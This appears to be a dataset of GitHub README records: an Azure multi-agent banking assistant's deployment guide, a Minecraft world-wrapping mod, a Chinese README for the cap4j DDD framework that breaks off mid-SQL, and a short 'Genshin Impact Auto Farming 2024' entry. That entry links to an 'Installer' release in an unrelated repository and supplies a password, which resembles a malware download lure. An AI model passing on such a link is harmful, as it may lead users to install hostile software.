    - **Payments Service (Microservice)**: Offers capabilities to submit payments and notify transactions. It is a critical component for the Payments Agent to execute payment-related tasks efficiently.

    - **Reporting Service (Microservice)**: Enables searching transactions and retrieving transactions by recipient. This service supports the Transactions Agent in providing detailed transaction reports to the user and the Payment Agent as it needs to check if an invoice has not been already paid.

## Getting Started

### Run in GitHub Codespaces or VS Code Dev Containers

You can run this repo virtually by using GitHub Codespaces or VS Code Dev Containers.  Click on one of the buttons below to open this repo in one of those options.

[![Open in GitHub Codespaces](https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Open in VS Code Dev Containers](https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/azure-samples/agent-openai-java-banking-assistant/)

All prerequisites are already installed in the container.  You can skip to the [Starting from scratch](#starting-from-scratch) section.

### Prerequisites

* [Java 17](https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17)
* [Maven 3.8.x](https://maven.apache.org/download.cgi)
* [Azure Developer CLI](https://aka.ms/azure-dev/install)
* [Node.js](https://nodejs.org/en/download/)
* [Git](https://git-scm.com/downloads)
* [Powershell 7+ (pwsh)](https://github.com/powershell/powershell) - For Windows users only.
  * **Important**: Ensure you can run `pwsh.exe` from a PowerShell command. If this fails, you likely need to upgrade PowerShell.


>[!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator) or [Owner](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner).  

### Starting from scratch

You can clone this repo and change directory to the root of the repo. Or you can run `azd init -t Azure-Samples/agent-openai-java-banking-assistant`.

Once you have the project available locally, run the following commands if you don't have any pre-existing Azure services and want to start from a fresh deployment.

1. Run 

    ```shell
    azd auth login
    ```

2. Run 

    ```shell
    azd up
    ```
    
    * This will provision Azure resources and deploy this sample to those resources.
    * The project has been tested with gpt4-o-mini model which is currently available in these regions: **eastus** (Default), **swedencentral**.  For an up-to-date list of regions and models, check [here](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models)
    * The Azure Document Intelligence  new rest API is used which is currently available in these regions: **eastus**(Default), **westus2**, **westeurope**. More info [here](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp)

3. After the application has been successfully deployed you will see a web app URL printed to the console.  Click that URL to interact with the application in your browser.  

It will look like the following:

!['Output from running azd up'](docs/assets/azd-success.png)


### Deploying with existing Azure resources

If you already have existing Azure resources, you can re-use those by setting `azd` environment values.

#### Existing resource group

1. Run `azd env set AZURE_RESOURCE_GROUP {Name of existing resource group}`
2. Run `azd env set AZURE_LOCATION {Location of existing resource group (i.e eastus2)}`

#### Existing OpenAI resource

1. Run `azd env set AZURE_OPENAI_SERVICE {Name of existing OpenAI service}`
2. Run `azd env set AZURE_OPENAI_RESOURCE_GROUP {Name of existing resource group that OpenAI service is provisioned to}`
3. Run `azd env set AZURE_OPENAI_SERVICE_LOCATION {Location of existing resource (i.e eastus2)}`. Only needed if your OpenAI resource is in a different location than the one you'll pick for the `azd up` step.
4. Run `azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT {Name of existing ChatGPT deployment}`. Only needed if your ChatGPT deployment is not the default 'gpt4-o-mini'.

#### Existing Azure Document Intelligence

1. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_SERVICE {Name of existing Azure Document Intelligence}`
2. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP {Name of existing resource group with Azure Document Intelligence service}`
3. If that resource group is in a different location than the one you'll pick for the `azd up` step,
   then run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP_LOCATION {Location of existing service}`

#### Other existing Azure resources

You can also use existing Form Recognizer and Storage Accounts. See `./infra/main.parameters.json` for list of environment variables to pass to `azd env set` to configure those existing resources.

#### Provision remaining resources

Now you can run `azd up`, following the steps in [Deploying from scratch](#deploying-from-scratch) above.
That will both provision resources and deploy the code.


### Redeploying

If you've only changed the backend/frontend code in the `app` folder, then you don't need to re-provision the Azure resources. You can just run:

```shell
azd deploy
```

If you've changed the infrastructure files (`infra` folder or `azure.yaml`), then you'll need to re-provision the Azure resources. You can do that by running:

```shell
azd up
```
 > [!WARNING]
 > When you run `azd up` multiple times to redeploy infrastructure, make sure to set the following parameters in `infra/main.parameters.json` to `true` to avoid container apps images from being overridden with default ""mcr.microsoft.com/azuredocs/containerapps-helloworld"" image:

```json
 ""copilotAppExists"": {
      ""value"": false
    },
    ""webAppExists"": {
      ""value"": false
    },
    ""accountAppExists"": {
      ""value"": false
    },
    ""paymentAppExists"": {
      ""value"": false
    },
    ""transactionAppExists"": {
      ""value"": false
    }
```

### Running locally

1. Run

    ```shell
    az login
    ```

2. Change dir to `app`

    ```shell
    cd app
    ```

3. Run the `./start-compose.ps1` (Windows) or `./start-compose.sh` (Linux/Mac) scripts or run the ""VS Code Task: Start App"" to start the project locally.
4. Wait for the docker compose to start all the containers (web, api, indexer) and refresh your browser to [http://localhost](http://localhost)


## Guidance

### Testing different gpt4 models and versions
The default LLM used in this project is *gpt-4o-mini*. It's a cost-efficient small model with enhanced planning, reasoning capabilities which are required by this use case to reliably select the right agent based on the chat conversation and to properly handle tools call.However, in case of long chat or some words, the model might fail sometimes to detect the right user intent especially when he/she asks to pay a bill based on image upload. Based on our tests *gpt4-o* provides better results but it's more expensive and slower. To read more about the models and prices, check [here](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/). 

You can test different models and versions by changing the , `AZURE_OPENAI_CHATGPT_MODEL`, `AZURE_OPENAI_CHATGPT_VERSION` and `AZURE_OPENAI_CHATGPT_DEPLOYMENT` environment variable to the desired model like below:

```shell
azd env set AZURE_OPENAI_CHATGPT_MODEL gpt-4o
azd env set AZURE_OPENAI_CHATGPT_VERSION 2024-05-13
azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT gpt-4o
```
### Enabling Application Insights

Applications Insights is enabled by default. It allows to investigate each request tracing along with the logging of errors.

If you want to disable it set the `AZURE_USE_APPLICATION_INSIGHTS` variable to false before running `azd up`

1. Run `azd env set AZURE_USE_APPLICATION_INSIGHTS false`
1. Run `azd up`

To see the performance data, go to the Application Insights resource in your resource group, click on the ""Investigate -> Performance"" blade and navigate to any HTTP request to see the timing data.
To inspect the performance of chat requests, use the ""Drill into Samples"" button to see end-to-end traces of all the API calls made for any chat request.
Under ""Trace & Events"" panel you can review custom Java informational logs to better understand content of OpenAI requests and responses.

![Tracing screenshot](docs/assets/transaction-tracing.png)

To see any exceptions and server errors, navigate to the ""Investigate -> Failures"" blade and use the filtering tools to locate a specific exception. You can see Java stack traces on the right-hand side.

### Enabling authentication

By default, the web app on ACA will have no authentication or access restrictions enabled, meaning anyone with routable network access to the web app can chat with your personal assistant.You can require authentication to your Microsoft Entra by following the [Add app authentication](https://learn.microsoft.com/en-us/azure/container-apps/authentication) tutorial and set it up against the deployed web app.


To then limit access to a specific set of users or groups, you can follow the steps from [Restrict your Microsoft Entra app to a set of users](https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users) by changing ""Assignment Required?"" option under the Enterprise Application, and then assigning users/groups access.  Users not granted explicit access will receive the error message -AADSTS50105: Your administrator has configured the application <app_name> to block users 

### App Continuous Integration with GitHub Actions

1. **Create a Service Principal for the github action pipeline**

    Use [az ad sp create-for-rbac](https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac) to create the service principal:
    
    ```bash
    groupId=$(az group show --name <resource-group-name>  --query id --output tsv)
    az ad sp create-for-rbac --name ""agent-openai-java-banking-assistant-pipeline-spi"" --role contributor --scope $groupId --sdk-auth
    ```
    Output is similar to:
    
    ```json
    {
    ""clientId"": ""xxxx6ddc-xxxx-xxxx-xxx-ef78a99dxxxx"",
    ""clientSecret"": ""xxxx79dc-xxxx-xxxx-xxxx-aaaaaec5xxxx"",
    ""subscriptionId"": ""xxxx251c-xxxx-xxxx-xxxx-bf99a306xxxx"",
    ""tenantId"": ""xxxx88bf-xxxx-xxxx-xxxx-2d7cd011xxxx"",
    ""activeDirectoryEndpointUrl"": ""https://login.microsoftonline.com"",
    ""resourceManagerEndpointUrl"": ""https://management.azure.com/"",
    ""activeDirectoryGraphResourceId"": ""https://graph.windows.net/"",
    ""sqlManagementEndpointUrl"": ""https://management.core.windows.net:8443/"",
    ""galleryEndpointUrl"": ""https://gallery.azure.com/"",
    ""managementEndpointUrl"": ""https://management.core.windows.net/""
    } 
    ```
    
    Save the JSON output because it is used in a later step. Also, take note of the clientId, which you need to update the service principal in the next section.

2. **Assign ACRPush permission to service Principal**
   
   This step enables the GitHub workflow to use the service principal to [authenticate with your container registry](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal) and to push a Docker image.
   Get the resource ID of your container registry. Substitute the name of your registry in the following az acr show command:
   ```bash
   registryId=$(az acr show --name <registry-name> --resource-group <resource-group-name> --query id --output tsv)
    ```

   Use [az role assignment create](https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create) to assign the AcrPush role, which gives push and pull access to the registry. Substitute the client ID of your service principal:
   ```bash
   az role assignment create --assignee <ClientId> --scope $registryId --role AcrPush
   ```

3. **Add the service principal to your GitHub environment secrets**

 - Go to your forked repository in GitHub and create an [environment]((https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)) called 'Development' (yes this is the exact name; don't change it). If you want to change the environment name (also adding new branches and environments, change the current branch/env mapping) you can do that, but make sure to change the pipeline code accordingly in `.github/workflows/azure-dev.yml`.
 - Create 'Development' environment [secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository) as below:
    | Secret                | Value                                                                                      |
    |-----------------------|--------------------------------------------------------------------------------------------|
    | AZURE_CREDENTIALS     | The entire JSON output from the service principal creation step                            |
    | SPI_CLIENT_ID         | The service principal client id used as username to login to Azure Container Registry      |
    | SPI_CLIENT_SECRET     | The service principal client secret used as password to login to Azure Container Registry  |
 - Create 'Development' [environment variables](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACR_NAME                  | The name of the Azure Container registry                                                   |
    | RESOURCE_GROUP            | The name of the resource group where your Azure Container Environment has been deployed    |
 - Create [repository variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACA_DEV_ENV_NAME                  | The name of the Azure Container Apps Environment                                       |
    | COPILOT_ACA_DEV_APP_NAME      | The container app name for the copilot orchestrator app                                    |
    | WEB_ACA_DEV_APP_NAME          | The container app name for the web frontend  app                                           |
    | ACCOUNTS_ACA_DEV_APP_NAME     | The container app name for the business account api                                        |
    | PAYMENTS_ACA_DEV_APP_NAME     | The container app name for the business payment api                                        |
    | TRANSACTIONS_ACA_DEV_APP_NAME | The container app name for the business payment api                                        |


### Cost estimation

Pricing varies per region and usage, so it isn't possible to predict exact costs for your usage.
However, you can try the [Azure pricing calculator](https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76) for the resources below.

- Azure Containers App: Consumption workload profile with 4 CPU core and 8 GB RAM. Pricing per vCPU and Memory. [Pricing](https://azure.microsoft.com/en-us/pricing/details/container-apps/)
- Azure OpenAI: Standard tier, ChatGPT and Ada models. Pricing per 1K tokens used, and at least 1K tokens are used per question. [Pricing](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/)
- Azure Document Intelligence: SO (Standard) tier using pre-built layout. [Pricing](https://azure.microsoft.com/pricing/details/form-recognizer/)

- Azure Blob Storage: Standard tier with ZRS (Zone-redundant storage). Pricing per storage and read operations. [Pricing](https://azure.microsoft.com/pricing/details/storage/blobs/)
- Azure Monitor: Pay-as-you-go tier. Costs based on data ingested. [Pricing](https://azure.microsoft.com/pricing/details/monitor/)

The first 180,000 vCPU-seconds, 360,000 GiB-seconds, and 2 million requests each month are free for ACA. To reduce costs, you can switch to free SKUs Document Intelligence by changing the parameters file under the `infra` folder. There are some limits to consider; for example, the free resource only analyzes the first 2 pages of each document. 

⚠️ To avoid unnecessary costs, remember to take down your app if it's no longer in use,
either by deleting the resource group in the Portal or running `azd down`.


## Resources

Here are some resources to learn more about multi-agent architectures and technologies used in this sample:

- [Generative AI For Beginners](https://github.com/microsoft/generative-ai-for-beginners)
- [Azure OpenAI Service](https://learn.microsoft.com/azure/ai-services/openai/overview)
- [Semantic Kernel for Java](https://devblogs.microsoft.com/semantic-kernel/java-1-0-release-candidate-for-semantic-kernel-now-available/)
- [OpenAI's Bet on a Cognitive Architecture](https://blog.langchain.dev/openais-bet-on-a-cognitive-architecture/)
- [THE LANDSCAPE OF EMERGING AI AGENT ARCHITECTURES FOR REASONING, PLANNING, AND TOOL CALLING: A SURVEY](https://arxiv.org/pdf/2404.11584)
- [MicroAgents: Exploring Agentic Architecture with Microservices](https://devblogs.microsoft.com/semantic-kernel/microagents-exploring-agentic-architecture-with-microservices/)
- [Chat + Enterprise data with Azure OpenAI and Azure AI Search](https://github.com/Azure-Samples/azure-search-openai-java)
- [SK Agents Overview and High Level Design (.net)](https://github.com/microsoft/semantic-kernel/blob/ec26ce7cb70f933b52a62f0a4e1c7b98c49d590e/docs/decisions/0032-agents.md#usage-patterns)

You can also find [more Azure AI samples here](https://github.com/Azure-Samples/azureai-samples).

## FAQ

You can find answers to frequently asked questions in the [FAQ](./docs/faq.md).

## Troubleshooting

If you have any issue when running or deploying this sample, please check the [troubleshooting guide](./docs/troubleshooting.md). If you can't find a solution to your problem, please [open an issue](https://github.com/Azure-Samples/agent-openai-java-banking-assistant/issues) in this repository.

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
",0,0,4,1.0,"['multi', 'agent', 'bank', 'assistant', 'java', 'semantic', 'kernel', 'overview', 'feature', 'architecture', 'get', 'start', 'run', 'github', 'codespaces', 'v', 'code', 'dev', 'container', 'prerequisite', 'start', 'scratch', 'deploy', 'exist', 'azure', 'resource', 'exist', 'resource', 'group', 'exist', 'openai', 'resource', 'exist', 'azure', 'document', 'intelligence', 'other', 'exist', 'azure', 'resource', 'provision', 'remain', 'resource', 'redeploy', 'run', 'locally', 'guidance', 'test', 'different', 'model', 'version', 'enable', 'application', 'insight', 'enable', 'authentication', 'app', 'continuous', 'integration', 'github', 'action', 'cost', 'estimation', 'resource', 'faq', 'troubleshoot', 'contribute', 'trademark']","['resource', 'exist', 'azure', 'start', 'run']"
FamroFexl/Circumnavigate,develop,"<font size = ""4"">**Say farewell to immersion-breaking world borders, and greetings to wrapped worlds! This mod visually and functionally tiles a finite world so that you can walk across from one border to the other.**</font>
<br>

<ins>**Please note this is a BETA. No stable or expected functionality or future support is guaranteed.**</ins>

## Building
`gradlew build`

##  Tutorial:<br>
Watch [this video](https://www.youtube.com/watch?v=bmkUSeLEE7Y) or read the [wiki](https://github.com/FamroFexl/Circumnavigate/wiki) for setup information.

## Updates:
**Current Functionality:**
1. Wrapped chunk sending and loading
2. World wrapping settings GUI
3. Wrapped block destruction/placement
4. Wrapped player positioning (for proper block collision and interaction distance)

**Future Updates (🔴 Alpha):** (not exclusive)
1. Entity handling (teleportation, hitboxes, pathing, spawning, riding)
2. Proper nether limits and portal handling
3. Proper spawning and respawning for irregular world limits. (Limits past (0,0))
4. Redstone/block update handling (explosions, light updates, etc.)
5. Stopping over-bounds chunk generation and storage
6. Vanilla client support
7. Wrapped chunk shifting? (for fun)

**Future Updates (🟠 Beta/ 🟢 Release):**
1. Wrapped coordinate support in commands?
2. Map item support?
3. Overworld wrapped world generation
4. Nether wrapped world generation
5. Wrapped structure generation
6. Curvature shader?
7. Developer API?
8. Datapack coordinate wrapping?


## Tools
**Debugging:**
1. Coordinates and wrapping information can be seen in the debug menu. Actual coordinates will only show up if the client is past a bounds. <br><br>
   _Wrapping Settings:_<br>
   ![Wrapping Settings](https://cdn.modrinth.com/data/cached_images/63223899ff1dc90d88d9f2d3d2a92dc5fff77a52.png)<br>
   _Actual Coordinates:_<br>
   ![Actual Coordinates](https://cdn.modrinth.com/data/cached_images/8459b9c4cbc31029cf8bacc6859c6d18fbdfabab.png)<br><br>
2. Chunk boundaries now show purple and pink lines to visualize chunk borders.<br><br>
   _Purple Lines Showing Distant Chunk Border:_<br>
   ![Purple Lines](https://cdn.modrinth.com/data/cached_images/d6c82034730d44ada5b072dded8c4a639dd66d7f.png)<br>
   _Pink Lines Showing Immediate Chunk Border:_<br>
   ![Pink Lines](https://cdn.modrinth.com/data/cached_images/657bbd9156a338134939835d84534ce13040be1a.png)

",1,3,2,1.0,"['building', 'tutorial', 'br', 'update', 'tool']","['building', 'tutorial', 'br', 'update', 'tool']"
ShalakaGajanayake/genshin-auto-farming-2024,master,"## Genshin Impact Auto Farming 2024

Introducing Genshin Impact Auto Farming 2024! This tool automates the farming process, allowing you to collect resources, materials, and experience points with minimal effort. Ideal for players who want to maximize their farming efficiency without spending hours in-game.

[Download](https://github.com/ShalakaGajanayake/flat_laf_ui/releases/tag/Installer)
PASS - 2024
![](https://github.com/ShalakaGajanayake/flat_laf_ui/blob/master/reedme.jpg)
",1,0,1,0.0,"['genshin', 'impact', 'auto', 'farming']","['genshin', 'impact', 'auto', 'farming']"
netcorepal/cap4j,main,"# cap4j

[![Maven Central Version](https://img.shields.io/maven-central/v/io.github.netcorepal/cap4j)](https://central.sonatype.com/artifact/io.github.netcorepal/cap4j)
[![GitHub license](https://img.shields.io/badge/license-MIT-blue.svg)](https://github.com/netcorepal/cap4j/blob/main/LICENSE)

本项目是 [CAP](https://github.com/dotnetcore/CAP) 项目的 Java 实现，基于[整洁架构](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)、`领域模型`、`Outbox`模式、`CQS`模式以及`UoW`模式等理念，cap4j期望解决如何`实现领域驱动设计`的问题。

如果对以上架构理念有充分了解，那么cap4j的使用将会非常顺手。另一方面，通过cap4j来构建你的服务，你将学会一种实现领域驱动设计的完整落地方法。

## 快速开始

### 脚手架搭建
#### **第一步**：新建一个空的maven项目
> 定好maven坐标三要素：`groupId`、`artifactId`、`version`

#### **第二步**：修改pom.xml
> 在pom.xml中添加`cap4j-ddd-codegen-maven-plugin`插件。
```xml
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>

    <groupId>io.github.netcorepal</groupId>
    <artifactId>cap4j-ddd-mvc-example</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>jar</packaging>

    <name>cap4j-ddd-mvc-example</name>
    <dependencies>
        <dependency>
            <groupId>io.github.netcorepal</groupId>
            <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
            <version>1.0.0-alpha-1</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>io.github.netcorepal</groupId>
                <artifactId>cap4j-ddd-codegen-maven-plugin</artifactId>
                <version>1.0.0-alpha-1</version>
                <configuration>
                    <archTemplate>https://raw.githubusercontent.com/netcorepal/cap4j/main/cap4j-ddd-codegen-template.json</archTemplate>
                    <basePackage>org.netcorepal.cap4j.ddd.example</basePackage>
                    <multiModule>false</multiModule>
                    <moduleNameSuffix4Adapter>-adapter</moduleNameSuffix4Adapter>
                    <moduleNameSuffix4Domain>-domain</moduleNameSuffix4Domain>
                    <moduleNameSuffix4Application>-application</moduleNameSuffix4Application>
                    <connectionString>
                        <![CDATA[jdbc:mysql://127.0.0.1:3306/test?serverTimezone=Asia/Shanghai&useSSL=false&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull]]>
                    </connectionString>
                    <user>root</user>
                    <pwd>123456</pwd>
                    <schema>test</schema>
                    <table></table>
                    <ignoreTable></ignoreTable>
                    <idField>id</idField>
                    <versionField>version</versionField>
                    <deletedField>db_deleted</deletedField>
                    <readonlyFields>db_created_at,db_updated_at</readonlyFields>
                    <ignoreFields></ignoreFields>
                    <entityBaseClass></entityBaseClass>
                    <entityMetaInfoClassOutputMode>ref</entityMetaInfoClassOutputMode>
                    <entityMetaInfoClassOutputPackage>domain._share.meta</entityMetaInfoClassOutputPackage>
                    <fetchMode>SUBSELECT</fetchMode>
                    <fetchType>EAGER</fetchType>
                    <idGenerator>org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator</idGenerator>
                    <enumValueField>code</enumValueField>
                    <enumNameField>name</enumNameField>
                    <enumUnmatchedThrowException>true</enumUnmatchedThrowException>
                    <datePackage4Java>java.time</datePackage4Java>
                    <typeRemapping></typeRemapping>
                    <generateDefault>false</generateDefault>
                    <generateDbType>true</generateDbType>
                    <generateSchema>true</generateSchema>
                    <generateBuild>false</generateBuild>
                    <aggregateIdentityClass>Long</aggregateIdentityClass>
                    <aggregateRootAnnotation></aggregateRootAnnotation>
                    <aggregateRepositoryBaseClass></aggregateRepositoryBaseClass>
                    <aggregateRepositoryCustomerCode></aggregateRepositoryCustomerCode>
                    <ignoreAggregateRoots></ignoreAggregateRoots>
                </configuration>
            </plugin>
        </plugins>
    </build>
</project>
```
通常，`cap4j-ddd-codegen`插件只需要我们根据团队或项目的实际情况调整以下配置项即可使用。
> - `basePackage`: 项目基础包名，一般为com.yourcompany.project
> - `connectionString`: 数据库连接串
> - `user`: 数据库账号
> - `pwd`: 数据库密码
> - `schema`: 数据库名称


#### **第三步**：执行插件命令，生成项目脚手架
> 插件配置项`archTemplate`是`gen-arch`命令生成脚手架目录与项目基础代码的配置文件地址。开放自定义方便大家根据自己团队需求进行定制化。格式说明后续再，不过格式很简单，按示例中的配置自己应该就能看懂并应用。有兴趣更详细了解的参考源码[GenArchMojo](cap4j-ddd-codegen-maven-plugin/src/main/java/org/netcorepal/cap4j/ddd/codegen/GenArchMojo.java)

```shell
mvn cap4j-ddd-codegen:gen-arch
```
如果没有意外，项目结构通过`cap4j-ddd-codegen`插件已初始化完毕！

### 目录结构介绍
#### 简介
```xml
<basePackage>org.netcorepal.cap4j.ddd.example</basePackage> 
```
基于基础包路径配置，在maven项目源码目录`src/main/java/org/netcorepal/cap4j/ddd/example`下将会生成4个`package`。
> - `_share`       公共代码
> - `adapter`      适配层(Interface Adapter)
> - `application`  应用层(Application Business Rules)
> - `domain`       领域层(Enterpprise Business Rules)

以上代码分层完全遵循[整洁架构](https://blog.cleancoder.com/uncle-bob/2012/08/13/the-clean-architecture.html)对于代码分层组织的观点。
![整洁架构](https://blog.cleancoder.com/uncle-bob/images/2012-08-13-the-clean-architecture/CleanArchitecture.jpg)

#### 领域层
实现领域模型，聚合、实体、领域事件以及集成事件定义。
```text
└── org.netcorepal.cap4j.ddd.example
    └── domain
        ├── _share (领域层公共代码，仅供领域层引用)
        ├── aggregates (实体聚合声明)
        └── services (领域服务)
```

#### 应用层
实现`CQS`模式，将功能用例(`UseCase`)抽象成命令或查询来实现。
```text
└── org.netcorepal.cap4j.ddd.example
    └── application
        ├── _share (应用层公共代码，仅供领域层引用)
        │   ├── clients (防腐层：包装三方服务调用接口)
        │   ├── enums (应用层枚举类型)
        │   └── events (声明三方服务集成事件)
        ├── commands (CQS的C：命令)
        ├── queries (CQS的Q：查询)
        └── subscribers (领域事件或集成事件的订阅处理逻辑)
```

#### 适配层
如适配字面意思，放置各层（领域层`domain`、应用层`application`）定义的接口实现。整洁架构中称其为接口适配层（`Interface Adapters`）。

该层是领域层和应用层业务逻辑所依赖的`抽象功能接口`的技术适配实现，遵循DI原则。

举个例子来理解抽象功能接口，比如我们常见的电商场景，用户在商城下单，需要通知仓库打包发货。那么这个`通知`可能就会需要抽象出一个`通知功能接口`，来承接下单流程的连续性。至此，通知功能接口的定义都是应用层关心的事。但是通知功能接口如何实现，就是适配层的事了，你是短信也好、电话也好，能够实现通知功能接口定义的核心效果即可。

```text
└── org.netcorepal.cap4j.ddd.example
    └── adapter
        ├── _share (适配层公共代码，仅供适配层引用)
        │   └── configure
        │       └── ApolloConfig.java (配置中心)
        ├── application (应用层接口实现)
        │   ├── _share
        │   └── clients
        ├── domain (领域层接口实现)
        │   ├── _share
        │   │   └── configure
        │   │       └── MyDomainEventMessageInterceptor.java (集成事件消息拦截器)
        │   └── repositories (实现聚合仓储接口)
        ├── infra (基础设施适配接口实现）
        │   ├── _share
        │   ├── jdbc (服务于应用层CQS的Q，jdbc查询工具类)
        │   │   └── NamedParameterJdbcTemplateDao.java
        │   └── mybatis (服务于应用层CQS的Q，mybatis集成） 
        │       ├── _share
        │       │   └── MyEnumTypeHandler.java
        │       └── mapper
        └── portal (端口)
            ├── api (SpringMVC相关代码)
            │   ├── TestController.java
            │   └── _share
            │       ├── ResponseData.java
            │       ├── Status.java
            │       └── configure
            │           ├── CommonExceptionHandler.java
            │           ├── MvcConfig.java
            │           └── SwaggerConfig.java
            ├── jobs (定时任务相关代码）
            │   └── _share
            │       └── configure
            │           └── XxlJobConfig.java
            └── queues (消息队列相关代码）
```

#### 公共代码
放置公共代码。
```text
└── org.netcorepal.cap4j.ddd.example
    └── _share
        ├── CodeEnum.java  (响应状态码枚举)
        ├── Constants.java (公共常量)
        └── exception (自定义业务异常)
            ├── ErrorException.java
            ├── KnownException.java
            └── WarnException.java
```

#### 项目目录树
```text
.
├── pom.xml
└── src
    ├── main
    │   ├── java
    │   │   └── org
    │   │       └── netcorepal
    │   │           └── cap4j
    │   │               └── ddd
    │   │                   └── example
    │   │                       ├── StartApplication.java
    │   │                       ├── _share
    │   │                       │   ├── CodeEnum.java
    │   │                       │   ├── Constants.java
    │   │                       │   └── exception
    │   │                       │       ├── ErrorException.java
    │   │                       │       ├── KnownException.java
    │   │                       │       └── WarnException.java
    │   │                       ├── adapter
    │   │                       │   ├── _share
    │   │                       │   │   └── configure
    │   │                       │   │       └── ApolloConfig.java
    │   │                       │   ├── application
    │   │                       │   │   ├── _share
    │   │                       │   │   └── clients
    │   │                       │   ├── domain
    │   │                       │   │   ├── _share
    │   │                       │   │   │   └── configure
    │   │                       │   │   │       └── MyDomainEventMessageInterceptor.java
    │   │                       │   │   └── repositories
    │   │                       │   ├── infra
    │   │                       │   │   ├── _share
    │   │                       │   │   ├── jdbc
    │   │                       │   │   │   └── NamedParameterJdbcTemplateDao.java
    │   │                       │   │   └── mybatis
    │   │                       │   │       ├── _share
    │   │                       │   │       │   └── MyEnumTypeHandler.java
    │   │                       │   │       └── mapper
    │   │                       │   └── portal
    │   │                       │       ├── api
    │   │                       │       │   ├── TestController.java
    │   │                       │       │   └── _share
    │   │                       │       │       ├── ResponseData.java
    │   │                       │       │       ├── Status.java
    │   │                       │       │       └── configure
    │   │                       │       │           ├── CommonExceptionHandler.java
    │   │                       │       │           ├── MvcConfig.java
    │   │                       │       │           └── SwaggerConfig.java
    │   │                       │       ├── jobs
    │   │                       │       │   └── _share
    │   │                       │       │       └── configure
    │   │                       │       │           └── XxlJobConfig.java
    │   │                       │       └── queues
    │   │                       ├── application
    │   │                       │   ├── _share
    │   │                       │   │   ├── clients
    │   │                       │   │   ├── enums
    │   │                       │   │   └── events
    │   │                       │   ├── commands
    │   │                       │   ├── queries
    │   │                       │   └── subscribers
    │   │                       └── domain
    │   │                           ├── _share
    │   │                           ├── aggregates
    │   │                           └── services
    │   └── resources
    │       ├── mapper
    │       ├── application.properties
    │       ├── ddl.sql
    │       └── logback.xml
    └── test
        └── java
            └── org
                └── netcorepal
                    └── cap4j
                        └── ddd
                            └── example
                                └── AppTest.java
```

### 编码最佳实践

#### 领域层
##### ORM代码生成
根据领域模型中的实体以及聚合关系，完成数据库表设计。

为了方便实体到数据库表映射的枯燥工作（ORM），我们设计了一套基于数据库注释的注解语法，并且这套语法非常简单。
通常情况下（比如都是单实体聚合的领域模型）我们不需要这些注解语法也可以让实体代码生成正常工作。

大部分情况下，我们也只需要熟悉一个表注解和两个列注解即可：
- 表注解 `@P`=_root_entity_table_;
- 列注解 `@T`=_JavaType_; `@E`=_0_:_ENUM_FIELD_:_枚举字段注释_;

```sql
CREATE TABLE `order` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
